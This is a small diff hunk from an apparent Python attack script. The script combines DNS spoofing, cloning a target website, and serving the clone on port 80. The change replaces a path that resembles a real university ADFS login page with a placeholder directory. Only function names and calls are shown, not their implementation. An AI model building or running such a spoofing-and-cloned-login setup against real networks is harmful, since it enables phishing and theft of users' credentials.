@@ -71,7 +71,7 @@ def dns_spoof(pkt):
 clone_website(f"https://{target_domain}", cloned_site_dir)
 
 # Start the web server in a separate thread
-web_server_thread = Thread(target=start_web_server, args=(80, "test/fs.singaporetech.edu.sg/adfs/ls"))
+web_server_thread = Thread(target=start_web_server, args=(80, "test1"))
 web_server_thread.start()
 
 # Start DNS spoofing
